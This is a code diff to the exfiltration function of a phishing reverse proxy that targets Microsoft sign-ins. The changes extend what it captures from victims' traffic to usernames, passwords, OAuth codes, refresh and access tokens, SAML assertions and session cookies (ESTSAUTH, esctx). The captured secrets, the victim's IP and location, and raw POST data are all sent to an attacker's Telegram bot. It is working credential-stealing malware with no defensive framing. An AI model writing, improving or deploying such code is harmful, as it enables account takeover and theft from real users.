@@ -107,42 +107,103 @@ async function sendToTelegram(data) {
             return;
         }
         
-        // ────── CHECK FOR CREDENTIALS (Username + Password REQUIRED) ──────
-        let username = 'N/A';
-        let password = 'N/A';
-        let hasCredentials = false;
-        
-        if (body) {
-            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
-            
-            const userMatch = bodyStr.match(/(?:username|login|user|Email|loginfmt)=([^&]+)/i);
-            const passMatch = bodyStr.match(/(?:password|passwd|Password)=([^&]+)/i);
-            
-            if (userMatch) username = decodeURIComponent(userMatch[1]);
-            if (passMatch) password = decodeURIComponent(passMatch[1]);
-            
-            if (username !== 'N/A' && password !== 'N/A') {
-                hasCredentials = true;
-            }
-        }
-        
-        // ────── CHECK FOR SESSION COOKIE ──────
-        const hasSessionCookie = data.proxyResponseHeaders?.['set-cookie'] && 
-                                 JSON.stringify(data.proxyResponseHeaders['set-cookie']).includes('esctx');
-        
-        // ────── SKIP IF NO CREDENTIALS AND NO SESSION COOKIE ──────
-        if (!hasCredentials && !hasSessionCookie) {
-            return;
-        }
-        
-        // ────── MARK AS NOTIFIED ──────
-        NOTIFIED_SESSIONS.add(sessionId);
-        
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                    data.proxyRequestHeaders?.['x-real-ip'] || 
                    data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
                    'Unknown';
 
+        // ────── CHECK FOR CREDENTIALS (BETTER PARSING) ──────
+        let username = 'N/A';
+        let password = 'N/A';
+        let hasCredentials = false;
+        let isSessionCookie = false;
+        let isTokenExchange = false;
+        
+        if (body) {
+            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+            
+            // ── MICROSOFT SPECIFIC PATTERNS ──
+            // Pattern 1: login? (username only on first step)
+            const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
+            if (userMatch) {
+                username = decodeURIComponent(userMatch[1]);
+                // Don't set hasCredentials yet — wait for password
+            }
+            
+            // Pattern 2: Password in second step
+            const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
+            if (passMatch) {
+                password = decodeURIComponent(passMatch[1]);
+                // If we have both from different requests, we'll combine later
+                // For now, flag that we have at least one credential
+                hasCredentials = true;
+            }
+            
+            // Pattern 3: Token exchange (refresh_token grant)
+            if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
+                isTokenExchange = true;
+                const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                if (refreshMatch) {
+                    // This is a token refresh — highly valuable
+                    hasCredentials = true;
+                }
+            }
+            
+            // Pattern 4: OAuth2 token endpoint (code exchange)
+            if (bodyStr.includes('code=') && bodyStr.includes('client_id=')) {
+                isTokenExchange = true;
+                hasCredentials = true;
+                const codeMatch = bodyStr.match(/code=([^&]+)/i);
+                if (codeMatch) {
+                    password = 'AUTH_CODE: ' + decodeURIComponent(codeMatch[1]).slice(0, 30) + '...';
+                }
+            }
+            
+            // Pattern 5: SAML assertion (federated login)
+            if (bodyStr.includes('SAMLResponse') || bodyStr.includes('SAMLRequest')) {
+                hasCredentials = true;
+                const samlMatch = bodyStr.match(/SAMLResponse=([^&]+)/i);
+                if (samlMatch) {
+                    password = 'SAML: ' + decodeURIComponent(samlMatch[1]).slice(0, 40) + '...';
+                }
+            }
+        }
+        
+        // ────── CHECK FOR SESSION COOKIE ──────
+        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
+        if (setCookieHeaders) {
+            const cookieStr = JSON.stringify(setCookieHeaders);
+            if (cookieStr.includes('esctx') || 
+                cookieStr.includes('ESTSAUTH') || 
+                cookieStr.includes('LoginOptions') ||
+                cookieStr.includes('.AspNetCore')) {
+                isSessionCookie = true;
+                hasCredentials = true; // Session cookie is as good as credentials
+            }
+        }
+        
+        // ────── CHECK FOR ACCESS TOKEN IN RESPONSE ──────
+        if (data.proxyResponseBody) {
+            const respStr = typeof data.proxyResponseBody === 'string' ? 
+                data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
+            if (respStr.includes('access_token') && respStr.includes('token_type')) {
+                hasCredentials = true;
+                isTokenExchange = true;
+                const tokenMatch = respStr.match(/"access_token":"([^"]+)"/);
+                if (tokenMatch) {
+                    username = 'ACCESS_TOKEN: ' + tokenMatch[1].slice(0, 20) + '...';
+                }
+            }
+        }
+        
+        // ────── SKIP IF NOTHING VALUABLE ──────
+        if (!hasCredentials) {
+            return;
+        }
+        
+        // ────── MARK AS NOTIFIED (only if we're actually sending) ──────
+        // We'll mark it after we send to avoid duplicates in case of failure
+        
         let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
         let flag = '🌍';
         let location = 'Unknown';
@@ -153,6 +214,7 @@ async function sendToTelegram(data) {
             location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
         }
 
+        // ────── BUILD MESSAGE ──────
         let message = `
 🔐 **New Login Captured!**
 
@@ -164,38 +226,71 @@ ${flag} **Location:** ${location}
 🕒 **Time:** ${data.timestamp || new Date().toISOString()}
 🔗 **URL:** ${url}
 📨 **Method:** ${method}
-📊 **Response:** ${data.proxyResponseStatusCode || 'N/A'}
+📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}
 
 🖥️ **User-Agent:** ${userAgent}
         `;
 
-        if (hasCredentials) {
+        if (username !== 'N/A') {
             message += `
-👤 **Username:** ${username}
+👤 **Username/Email:** ${username}
+            `;
+        }
+        
+        if (password !== 'N/A' && !password.includes('AUTH_CODE') && !password.includes('SAML')) {
+            message += `
 🔐 **Password:** ${password}
             `;
-        }
-
-        if (hasSessionCookie) {
+        } else if (password !== 'N/A') {
             message += `
-🍪 **Session Cookie:** ✅ Captured (esctx)
-🔑 **Status:** Logged in as victim
+🔑 **Token/Code:** ${password}
             `;
         }
 
+        if (isSessionCookie) {
+            message += `
+🍪 **Session Cookie:** ✅ Captured
+🔑 **Status:** Authenticated session
+            `;
+        }
+
+        if (isTokenExchange) {
+            message += `
+🔄 **Token Exchange:** ✅ Detected
+💎 **Value:** High (refresh token / access token)
+            `;
+        }
+
+        // ────── SEND TELEGRAM ──────
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         });
 
+        // ────── SEND COOKIES AS FILE ──────
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
-        if (cookies) {
+        if (cookies && Object.keys(cookies).length > 0) {
             await sendCookiesAsFile(cookies, sessionId);
+        }
+
+        // ────── MARK AS NOTIFIED ──────
+        NOTIFIED_SESSIONS.add(sessionId);
+
+        // ────── ALSO SEND A SEPARATE SHORT MESSAGE WITH THE RAW DATA ──────
+        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
+            try {
+                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    chat_id: CHAT_ID,
+                    text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
+                    parse_mode: 'Markdown'
+                });
+            } catch (e) {}
         }
 
     } catch (e) {
         console.log('Telegram send failed', e.message);
+        // Don't mark as notified on failure so we retry later
     }
 }
 
